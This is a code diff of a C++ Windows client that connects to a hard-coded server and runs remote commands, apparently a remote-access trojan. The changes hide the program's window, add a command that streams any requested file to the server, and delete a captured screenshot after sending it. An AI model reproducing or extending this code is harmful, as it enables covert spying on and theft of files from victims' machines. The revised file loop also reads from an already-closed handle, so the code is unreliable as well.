@@ -13,7 +13,7 @@
 
 #define PORT 666
 #define SERVERADDR "192.168.1.69"
-//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "GdiPlus.lib")
 
@@ -21,13 +21,6 @@ static const GUID png =
 { 0x557cf406, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };
 
 using namespace std;
-
-bool checkend(char *arr, int len) {
-	for (int i = 0; i < len - 3; i++) {
-		if (arr[i] != '\0')return true;
-	}
-	return false;
-}
 
 int main()
 {
@@ -210,41 +203,32 @@ int main()
 		}
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'd')) {
 			string fop = buff + 4;
+			FILE *in;
+			fopen_s(&in, fop.c_str(), "rb");
+			long int size;
+			fseek(in, 0, SEEK_END);
+			size = ftell(in);
+			fclose(in);
+			char size1[256] = "";
+			_itoa_s(size, size1, 10);
+			strcat_s(size1, "%byte%\0");
+			int len = 0;
+			for (int i = 0; i < sizeof(size1) / sizeof(size); i++) {
+				if (size1[i] != '\0')len++;
+				else {
+					break;
+				}
+			}
+			send(my_sock, size1, len, 0);
 			FILE *in1;
 			fopen_s(&in1, fop.c_str(), "rb");
 			const int buflen = 1024;
-			bool end = false;
-			bool end2 = false;
+			int bytesen = 0;
 			while (1) {
 				char bufer[buflen] = "";
-				if (!end) {
-					int b = fread(bufer, 1, sizeof(bufer), in1);
-					if (b < buflen - 2) {
-						bufer[buflen - 1] = '@';
-						bufer[buflen - 2] = '@';
-						bufer[buflen - 3] = '^';
-						end2 = true;
-					}
-					else if (b == (buflen - 2)) {
-						bufer[buflen - 1] = '\0';
-						bufer[buflen - 2] = '\0';
-						end = true;
-					}
-					else if (b == (buflen - 1)) {
-						bufer[buflen - 1] = '\0';
-						end = true;
-					}
-					int size = ftell(in1);
-					send(my_sock, bufer, buflen, 0);
-					if (end2) { break; }
-				}
-				else {
-					bufer[buflen - 1] = '@';
-					bufer[buflen - 2] = '@';
-					bufer[buflen - 3] = '^';
-					send(my_sock, bufer, buflen, 0);
-					break;
-				}
+				int b = fread(bufer, 1, sizeof(bufer), in);
+				send(my_sock, bufer, b, 0);
+				if (b < buflen)break;
 			}
 			fclose(in1);
 		}
@@ -297,7 +281,7 @@ int main()
 					if (b < buflen)break;
 			}
 			fclose(in1);
-			//remove("screen.png");
+			remove("screen.png");
 
 		}
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'l')) {
